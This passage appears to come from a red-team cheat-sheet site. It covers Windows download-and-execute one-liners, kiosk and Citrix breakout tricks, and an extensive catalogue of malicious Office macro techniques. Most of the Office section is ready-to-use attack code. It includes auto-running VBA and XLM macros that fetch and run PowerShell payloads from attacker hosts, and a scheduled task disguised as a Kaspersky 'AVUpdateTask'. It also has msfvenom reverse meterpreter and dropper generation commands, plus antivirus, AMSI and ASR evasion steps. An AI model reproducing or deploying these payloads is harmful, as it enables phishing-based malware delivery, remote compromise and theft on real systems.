C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll Regsvr32 @subTee # regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll Odbcconf # odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt} Msbuild # cmd /V /c \u0026#34;set MB=\u0026#34;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\u0026#34; \u0026amp; !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml \u0026gt; payload.xml \u0026amp; !MB! payload.xml\u0026#34; Certutil # certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.dll \u0026amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.exe \u0026amp; payload.exe Bitsadmin # bitsadmin /transfer mydownloadjob /download /priority normal http://\u0026lt;attackerIP\u0026gt;/xyz.exe C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe References # arno0x0x - Windows oneliners to download remote payload and execute arbitrary code "},{"id":14,"href":"/docs/escape_breakout/","title":"Application Escape and Breakout","section":"Docs","content":" Application Escape and Breakout # Gaining a command shell # Shortcut [Window] + [R] -\u0026gt; cmd [CTRL] + [SHIFT] + [ESC] -\u0026gt; Task Manager [CTRL] + [ALT] + [DELETE] -\u0026gt; Task Manager Access through file browser: Browsing to the folder containing the binary (i.e. C:\\windows\\system32\\), we can simply right click and open it Drag-and-drop: dragging and dropping any file onto the cmd.exe Hyperlink: file:///c:/Windows/System32/cmd.exe Task Manager: File \u0026gt; New Task (Run...) \u0026gt; cmd MSPAINT.exe Open MSPaint.exe and set the canvas size to: Width=6 and Height=1 pixels Zoom in to make the following tasks easier Using the colour picker, set pixels values to (from left to right): 1st: R: 10, G: 0, B: 0 2nd: R: 13, G: 10, B: 13 3rd: R: 100, G: 109, B: 99 4th: R: 120, G: 101, B: 46 5th: R: 0, G: 0, B: 101 6th: R: 0, G: 0, B: 0 Save it as 24-bit Bitmap (.bmp;.dib) Change its extension from bmp to bat and run Sticky Keys # Spawn the sticky keys dialog Via Shell URI : shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D} Hit 5 times [SHIFT] Visit \u0026ldquo;Ease of Access Center\u0026rdquo; You land on \u0026ldquo;Setup Sticky Keys\u0026rdquo;, move up a level on \u0026ldquo;Ease of Access Center\u0026rdquo; Start the OSK (On-Screen-Keyboard) You can now use the keyboard shortcut (CTRL+N) Dialog Boxes # Creating new files # Batch files – Right click \u0026gt; New \u0026gt; Text File \u0026gt; rename to .BAT (or .CMD) \u0026gt; edit \u0026gt; open Shortcuts – Right click \u0026gt; New \u0026gt; Shortcut \u0026gt; %WINDIR%\\system32 Open a new Windows Explorer instance # Right click any folder \u0026gt; select Open in new window Exploring Context Menus # Right click any file/folder and explore context menus Clicking Properties, especially on shortcuts, can yield further access via Open File Location Save as # \u0026ldquo;Save as\u0026rdquo; / \u0026ldquo;Open as\u0026rdquo; option \u0026ldquo;Print\u0026rdquo; feature – selecting \u0026ldquo;print to file\u0026rdquo; option (XPS/PDF/etc) \\\\127.0.0.1\\c$\\Windows\\System32\\ and execute cmd.exe Input Boxes # Many input boxes accept file paths; try all inputs with UNC paths such as //attacker–pc/ or //127.0.0.1/c$ or C:\\\nBypass file restrictions # Enter . or *.exe or similar in File name box\nInternet Explorer # Download and Run/Open # Text files -\u0026gt; opened by Notepad Menus # The address bar Search menus Help menus Print menus All other menus that provide dialog boxes Accessing filesystem # Enter these paths in the address bar:\nfile://C:/windows C:/windows/ %HOMEDRIVE% \\127.0.0.1\\c$\\Windows\\System32 Unassociated Protocols # It is possible to escape a browser based kiosk with other protocols than usual http or https. If you have access to the address bar, you can use any known protocol (irc, ftp, telnet, mailto, etc.) to trigger the open with prompt and select a program installed on the host. The program will than be launched with the uri as a parameter, you need to select a program that will not crash when recieving it. It is possible to send multiple parameters to the program by adding spaces in your uri.\nNote: This technique required that the protocol used is not already associated with a program.\nExample - Launching Firefox with a custom profile:\nThis is a nice trick since Firefox launched with the custom profile may not be as much hardened as the default profile.\nFirefox need to be installed. Enter the following uri in the address bar: irc://127.0.0.1 -P \u0026quot;Test\u0026quot; Press enter to navigate to the uri. Select the firefox program. Firefox will be launched with the profile Test. In this example, it\u0026rsquo;s the equivalent of running the following command:\nfirefox irc://127.0.0.1 -P \u0026#34;Test\u0026#34; Shell URI Handlers # shell:DocumentsLibrary shell:Librariesshell:UserProfiles shell:Personal shell:SearchHomeFolder shell:System shell:NetworkPlacesFolder shell:SendTo shell:Common Administrative Tools shell:MyComputerFolder shell:InternetFolder References # PentestPartners - Breaking out of Citrix and other restricted desktop environments Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks - Scott Sutherland - May 22nd, 2013 Escaping from KIOSKs - HackTricks Breaking out of Windows Kiosks using only Microsoft Edge - Firat Acar - May 24, 2022 "},{"id":15,"href":"/docs/office_attacks/","title":"Attacking Office","section":"Docs","content":" Office - Attacks # XLSM - Hot Manchego # When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn\u0026rsquo;t catch a simple lolbas payload to get a beacon on a target machine.\nhttps://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS\u0026gt; New-Item blank.xlsm PS\u0026gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs PS\u0026gt; .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt XLM - Macrome # XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.\nhttps://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b \u0026#39;\\x00\u0026#39; --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread \u0026gt; popcalc.bin msfvenom -a x64 -b \u0026#39;\\x00\u0026#39; --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread \u0026gt; popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b \u0026#39;\\x00\u0026#39; msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b \u0026#39;\\x00\u0026#39; # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b \u0026#39;\\x00\u0026#39; -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b \u0026#39;\\x00\u0026#39; -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the \u0026ndash;password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.\nXLM Excel 4.0 - SharpShooter # https://github.com/mdsecactivebreach/SharpShooter # Options -rawscfile \u0026lt;path\u0026gt; Path to raw shellcode file for stageless payloads --scfile \u0026lt;path\u0026gt; Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b \u0026#39;\\x00\u0026#39; SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b \u0026#39;\\x00\u0026#39; SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee XLM Excel 4.0 - EXCELntDonut # XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, \u0026hellip;) Open an Excel Workbook. Right click on \u0026ldquo;Sheet 1\u0026rdquo; and click \u0026ldquo;Insert\u0026hellip;\u0026rdquo;. Select \u0026ldquo;MS Excel 4.0 Macro\u0026rdquo;. Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we\u0026rsquo;ll use the \u0026ldquo;Text-to-Columns\u0026rdquo;/\u0026ldquo;Convert\u0026rdquo; tool under the \u0026ldquo;Data\u0026rdquo; tab. Highlight column A and open the \u0026ldquo;Text-to-Columns\u0026rdquo; tool. Select \u0026ldquo;Delimited\u0026rdquo; and then \u0026ldquo;Semicolon\u0026rdquo; on the next screen. Select \u0026ldquo;Finished\u0026rdquo;. Right-click on cell A1* and select \u0026ldquo;Run\u0026rdquo;. This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1* to \u0026ldquo;Auto_Open\u0026rdquo;. You can do this by clicking into cell A1 and then clicking into the box that says \u0026ldquo;A1\u0026rdquo;* just above Column A. Change the text from \u0026ldquo;A1\u0026rdquo;* to \u0026ldquo;Auto_Open\u0026rdquo;. Save the file and verify that auto-execution works. :warning: If you\u0026rsquo;re using the obfuscate flag, after the Text-to-columns operation, your macros won\u0026rsquo;t start in A1. Instead, they\u0026rsquo;ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let\u0026rsquo;s say that cell is HJ1. If that\u0026rsquo;s the case, then complete steps 6-7 substituting HJ1 for A1\ngit clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r \u0026#39;System.Management\u0026#39;) -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md\nXLM Excel 4.0 - EXEC # Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro =EXEC(\u0026#34;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(\u0026#39;http://10.10.10.10:80/update.ps1\u0026#39;)\u0026#34;) =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide DOCM - Metasploit # use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j DOCM - Download and Execute # Detected by Defender (AMSI)\nSub Execute() Dim payload payload = \u0026#34;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring(\u0026#39;http://10.10.10.10:4242/exploit\u0026#39;);\u0026#34; Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub DOCM - Macro Creator # https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\\PS\u0026gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\\PS\u0026gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\\PS\u0026gt; Invoke-MacroCreator -i regsvr32.sct -t file -url \u0026#39;http://my.server.com/sources.xml\u0026#39; -d biblio -c \u0026#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll\u0026#39; -o -e DOCM - C# converted to Office VBA macro # A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.\nhttps://github.com/trustedsec/unicorn\npython unicorn.py payload.cs cs macro DOCM - VBA Wscript # https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office\nSub parent_change() Dim objOL Set objOL = CreateObject(\u0026#34;Outlook.Application\u0026#34;) Set shellObj = objOL.CreateObject(\u0026#34;Wscript.Shell\u0026#34;) shellObj.Run(\u0026#34;notepad.exe\u0026#34;) End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub CreateObject(\u0026#34;WScript.Shell\u0026#34;).Run \u0026#34;calc.exe\u0026#34; CreateObject(\u0026#34;WScript.Shell\u0026#34;).Exec \u0026#34;notepad.exe\u0026#34; DOCM - VBA Shell Execute Comment # Set your command payload inside the Comment metadata of the document.\nSub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = \u0026#34;Comments\u0026#34; Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub DOCM - VBA Spawning via svchost.exe using Scheduled Task # Sub AutoOpen() Set service = CreateObject(\u0026#34;Schedule.Service\u0026#34;) Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = \u0026#34;Kaspersky Corporation\u0026#34; td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(\u0026#34;s\u0026#34;, 30, Now) startTime = Year(ts) \u0026amp; \u0026#34;-\u0026#34; \u0026amp; Right(Month(ts), 2) \u0026amp; \u0026#34;-\u0026#34; \u0026amp; Right(Day(ts), 2) \u0026amp; \u0026#34;T\u0026#34; \u0026amp; Right(Hour(ts), 2) \u0026amp; \u0026#34;:\u0026#34; \u0026amp; Right(Minute(ts), 2) \u0026amp; \u0026#34;:\u0026#34; \u0026amp; Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = \u0026#34;TimeTriggerId\u0026#34; Dim Action: Set Action = td.Actions.Create(0) Action.Path = \u0026#34;C:\\Windows\\System32\\powershell.exe\u0026#34; Action.Arguments = \u0026#34;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0026#39;http://192.168.1.59:80/fezsdfqs\u0026#39;))\u0026#34; Call service.GetFolder(\u0026#34;\\\u0026#34;).RegisterTaskDefinition(\u0026#34;AVUpdateTask\u0026#34;, td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://192.168.1.59:80/fezsdfqs\u0026#39;))\u0026#34; DOCM - WMI COM functions # Basic WMI exec (detected by Defender) : r = GetObject(\u0026quot;winmgmts:\\\\.\\root\\cimv2:Win32_Process\u0026quot;).Create(\u0026quot;calc.exe\u0026quot;, null, null, intProcessID)\nSub wmi_exec() strComputer = \u0026#34;.\u0026#34; Set objWMIService = GetObject(\u0026#34;winmgmts:\\\\\u0026#34; \u0026amp; strComputer \u0026amp; \u0026#34;\\root\\cimv2\u0026#34;) Set objStartUp = objWMIService.Get(\u0026#34;Win32_ProcessStartup\u0026#34;) Set objProc = objWMIService.Get(\u0026#34;Win32_Process\u0026#34;) Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create \u0026#34;powershell.exe\u0026#34;, Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = \u0026#34;.\u0026#34; Set objWMIService = GetObject(\u0026#34;win\u0026#34; \u0026amp; \u0026#34;mgmts\u0026#34; \u0026amp; \u0026#34;:\\\\\u0026#34; \u0026amp; strComputer \u0026amp; \u0026#34;\\root\u0026#34; \u0026amp; \u0026#34;\\cimv2\u0026#34;) Set objStartup = objWMIService.Get(\u0026#34;Win32_\u0026#34; \u0026amp; \u0026#34;Process\u0026#34; \u0026amp; \u0026#34;Startup\u0026#34;) Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(\u0026#34;winmgmts:\\\\\u0026#34; \u0026amp; strComputer \u0026amp; \u0026#34;\\root\u0026#34; \u0026amp; \u0026#34;\\cimv2\u0026#34; \u0026amp; \u0026#34;:Win32_\u0026#34; \u0026amp; \u0026#34;Process\u0026#34;) objProcess.Create \u0026#34;cmd.exe /c powershell.exe IEX ( IWR -uri \u0026#39;http://10.10.10.10/stage.ps1\u0026#39;)\u0026#34;, Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = \u0026#34;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\u0026#34; Set SW = GetObject(\u0026#34;new:\u0026#34; \u0026amp; ShellWindows).Item() SW.Document.Application.ShellExecute \u0026#34;cmd.exe\u0026#34;, \u0026#34;/c powershell.exe\u0026#34;, \u0026#34;C:\\Windows\\System32\u0026#34;, Null, 0 DOCM/XLM - Macro Pack - Macro and DDE # Only the community version is available online.\nhttps://github.com/sevagas/macro_pack # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo \u0026#34;calc.exe\u0026#34; | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo \u0026lt;file_to_drop_url\u0026gt; \u0026#34;\u0026lt;download_path\u0026gt;\u0026#34; | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo \u0026#34;https://myurl.url/payload.exe\u0026#34; \u0026#34;dropped.exe\u0026#34; | macro_pack.exe -o -t DROPPER -G \u0026#34;drop.xlsm\u0026#34; # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk # PRO: XLM Injection echo \u0026#34;MPPro\u0026#34; | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo \u0026#34;x32calc.bin\u0026#34; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo \u0026#34;x32calc.bin\u0026#34; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive echo \u0026#34;x86.bin\u0026#34; \u0026#34;x64.bin\u0026#34; | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc echo \u0026#34;http://192.168.5.10:8080/x32calc.bin\u0026#34; \u0026#34;http://192.168.5.10:8080/x64calc.bin\u0026#34; | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls DOCM - BadAssMacros # C# based automated Malicous Macro Generator.\nhttps://github.com/Inf0secRabbit/BadAssMacros BadAssMacros.exe -h # Create VBA for classic shellcode injection from raw shellcode BadAssMacros.exe -i \u0026lt;path_to_raw_shellcode_file\u0026gt; -w \u0026lt;doc/excel\u0026gt; -p no -s classic -c \u0026lt;caesar_shift_value\u0026gt; -o \u0026lt;path_to_output_file\u0026gt; BadAssMacros.exe -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt # Create VBA for indirect shellcode injection from raw shellcode BadAssMacros.exe -i \u0026lt;path_to_raw_shellcode_file\u0026gt; -w \u0026lt;doc/excel\u0026gt; -p no -s indirect -o \u0026lt;path_to_output_file\u0026gt; # List modules inside Doc/Excel file BadAssMacros.exe -i \u0026lt;path_to_doc/excel_file\u0026gt; -w \u0026lt;doc/excel\u0026gt; -p yes -l # Purge Doc/Excel file BadAssMacros.exe -i \u0026lt;path_to_doc/excel_file\u0026gt; -w \u0026lt;doc/excel\u0026gt; -p yes -o \u0026lt;path_to_output_file\u0026gt; -m \u0026lt;module_name\u0026gt; DOCM - CACTUSTORCH VBA Module # CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript\nhttps://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text \u0026ldquo;test\u0026rdquo; Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch DOCM - MMG with Custom DL + Exec # Custom Download in first Macro to \u0026ldquo;C:\\Users\\Public\\beacon.exe\u0026rdquo; Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { \u0026#34;description\u0026#34;: \u0026#34;Generic command exec payload\\nEvasion technique set to none\u0026#34;, \u0026#34;template\u0026#34;: \u0026#34;templates/payloads/generic-cmd-template.vba\u0026#34;, \u0026#34;varcount\u0026#34;: 152, \u0026#34;encodingoffset\u0026#34;: 5, \u0026#34;chunksize\u0026#34;: 180, \u0026#34;encodedvars\u0026#34;: {}, \u0026#34;vars\u0026#34;: [], \u0026#34;evasion\u0026#34;: [\u0026#34;encoder\u0026#34;], \u0026#34;payload\u0026#34;: \u0026#34;cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\u0026#34; } Private Declare PtrSafe Function URLDownloadToFile Lib \u0026#34;urlmon\u0026#34; Alias \u0026#34;URLDownloadToFileA\u0026#34; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False \u0026#39;As directory must exist, this is a check If CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;).FolderExists(CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;).GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) \u0026#39;If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) \u0026gt; 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA \u0026#34;http://10.10.10.10/macro.exe\u0026#34;, \u0026#34;C:\\\\Users\\\\Public\\\\beacon.exe\u0026#34; End Sub Sub Auto_Open() DownloadFileA \u0026#34;http://10.10.10.10/macro.exe\u0026#34;, \u0026#34;C:\\\\Users\\\\Public\\\\beacon.exe\u0026#34; End Sub DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro # Go to Developer tab on ribbon -\u0026gt; Insert -\u0026gt; More Controls -\u0026gt; Microsoft InkPicture Control\nPrivate Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(\u0026#34;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(\u0026#39;https://\u0026lt;host\u0026gt;/file.exe\u0026#39;,\u0026#39;file.exe\u0026#39;);Start-Process \u0026#39;file.exe\u0026#39;\u0026#34;, vbNormalFocus) End Sub VBA Obfuscation # # https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin VBA Purging # VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.\n:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.\nOfficePurge # https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\\malicious.doc -l EvilClippy # Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.\n# OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc VBA - Offensive Security Template # Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - 